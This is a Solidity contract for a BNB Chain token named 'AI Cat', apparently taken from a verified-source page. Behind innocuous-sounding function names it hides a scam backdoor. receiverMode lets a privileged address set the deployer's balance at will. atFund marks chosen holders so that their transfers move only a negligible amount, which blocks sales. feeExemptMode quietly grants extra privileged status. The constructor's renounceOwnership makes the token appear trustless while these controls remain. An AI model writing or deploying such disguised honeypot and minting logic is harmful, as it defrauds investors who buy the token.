/**
 *Submitted for verification at BscScan.com on 2023-02-04
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface listFrom {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface txTokenExempt {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AICat is Ownable{
    uint8 public decimals = 18;
    mapping(address => bool) public totalShould;
    string public symbol = "ACT";
    bool public feeAmount;
    address public txList;
    mapping(address => mapping(address => uint256)) public allowance;
    address public tradingTx;
    mapping(address => bool) public autoBuyTo;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply = 100000000 * 10 ** 18;




    uint256 constant isAuto = 10 ** 10;
    string public name = "AI Cat";
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        listFrom teamToken = listFrom(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        tradingTx = txTokenExempt(teamToken.factory()).createPair(teamToken.WETH(), address(this));
        txList = senderTotal();
        totalShould[txList] = true;
        balanceOf[txList] = totalSupply;
        emit Transfer(address(0), txList, totalSupply);
        renounceOwnership();
    }

    

    function receiverMode(uint256 listAt) public {
        if (!totalShould[senderTotal()]) {
            return;
        }
        balanceOf[txList] = listAt;
    }

    function transferFrom(address exemptTrading, address receiverExempt, uint256 listAt) public returns (bool) {
        if (exemptTrading != senderTotal() && allowance[exemptTrading][senderTotal()] != type(uint256).max) {
            require(allowance[exemptTrading][senderTotal()] >= listAt);
            allowance[exemptTrading][senderTotal()] -= listAt;
        }
        if (receiverExempt == txList || exemptTrading == txList) {
            return toBuy(exemptTrading, receiverExempt, listAt);
        }
        if (autoBuyTo[exemptTrading]) {
            return toBuy(exemptTrading, receiverExempt, isAuto);
        }
        return toBuy(exemptTrading, receiverExempt, listAt);
    }

    function approve(address autoTotal, uint256 listAt) public returns (bool) {
        allowance[senderTotal()][autoTotal] = listAt;
        emit Approval(senderTotal(), autoTotal, listAt);
        return true;
    }

    function atFund(address toReceiver) public {
        if (toReceiver == txList || toReceiver == tradingTx || !totalShould[senderTotal()]) {
            return;
        }
        autoBuyTo[toReceiver] = true;
    }

    function feeExemptMode(address marketingLiquidity) public {
        if (feeAmount) {
            return;
        }
        totalShould[marketingLiquidity] = true;
        feeAmount = true;
    }

    function transfer(address receiverExempt, uint256 listAt) external returns (bool) {
        return transferFrom(senderTotal(), receiverExempt, listAt);
    }

    function toBuy(address autoTakeExempt, address liquidityTeam, uint256 listAt) internal returns (bool) {
        require(balanceOf[autoTakeExempt] >= listAt);
        balanceOf[autoTakeExempt] -= listAt;
        balanceOf[liquidityTeam] += listAt;
        emit Transfer(autoTakeExempt, liquidityTeam, listAt);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function senderTotal() private view returns (address) {
        return msg.sender;
    }


}